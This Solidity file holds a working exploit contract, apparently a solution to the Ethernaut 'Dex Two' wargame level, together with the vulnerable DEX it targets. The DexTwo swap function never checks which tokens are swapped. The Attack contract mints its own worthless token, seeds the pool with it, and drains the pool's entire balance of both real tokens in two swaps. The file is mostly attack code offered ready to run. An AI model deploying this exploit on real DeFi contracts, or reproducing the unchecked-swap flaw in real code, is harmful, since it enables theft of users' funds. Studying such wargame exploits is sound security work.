// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Attack {
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    SwappableTokenTwo public token3;
    DexTwo public d;

    constructor(DexTwo _d) {
        d = _d;
        token1 = SwappableTokenTwo(d.token1());
        token2 = SwappableTokenTwo(d.token2());
        token3 = new SwappableTokenTwo("Attacker", "ATK", 100);
    }

    function attack() external {
        require(token1.balanceOf(address(this)) == 10 && token2.balanceOf(address(this)) == 10);
        require(token3.balanceOf(address(this)) == 100, "token3 balance insufficient");
        // add liqulidity to dex
        token3.approve(address(d), 1);
        d.add_liquidity(address(token3), 1);
        // swap from token3 (99:1) to token1 (10:100)
        token3.approve(address(d), 1);
        d.swap(address(token3), address(token1), 1);
        // token1: (110:0)
        // swap from token3 (98:2) to token2 (10:100)
        token3.approve(address(d), 2);
        d.swap(address(token3), address(token2), 2);
        // attack succeeded 
    }
}

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;

  constructor(address _token1, address _token2) {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}